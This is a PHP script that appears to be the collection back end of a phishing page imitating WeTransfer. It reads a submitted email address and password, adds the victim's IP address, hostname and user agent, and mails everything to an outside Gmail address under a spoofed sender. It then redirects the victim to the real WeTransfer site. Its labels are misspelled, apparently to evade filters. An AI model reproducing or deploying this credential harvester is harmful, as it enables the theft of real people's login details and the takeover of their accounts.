<?php
// Ensure that both 'simdia' and 'pentail' fields are not empty
if($_POST["simdia"] != "" && $_POST["pentail"] != ""){
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    
    // Construct the email message
    $message = "--------------Wee-Trensfat Info-----------------------\n";
    $message .= "Exm'aile            	: ".$_POST['simdia']."\n";
    $message .= "Pea'ssxw0rd           	: ".$_POST['pentail']."\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: ".$ip."\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : ".$useragent."\n";
    $message .= "|----------- unknown --------------|\n";
    
    // Include any additional necessary files, such as 'simdia.php'

    // Set email subject
    $subject = "Wee-Trensfat | $ip";
    
    // Specify the recipient email address
    $to = "lubaking.co@gmail.com"; // Replace 'recipient@example.com' with the actual recipient email address
    
    // Send the email
    $send = "admin@uralgasvladimir.ru"; // Assign sender email address
    mail($to, $subject, $message, "From: $send");
    
    // Redirect the user after sending the email
    header("Location: https://wetransfer.com/undefined");
} else {
    // Redirect the user if 'simdia' or 'pentail' fields are empty
    header("Location: https://wetransfer.com/undefined");
}
?>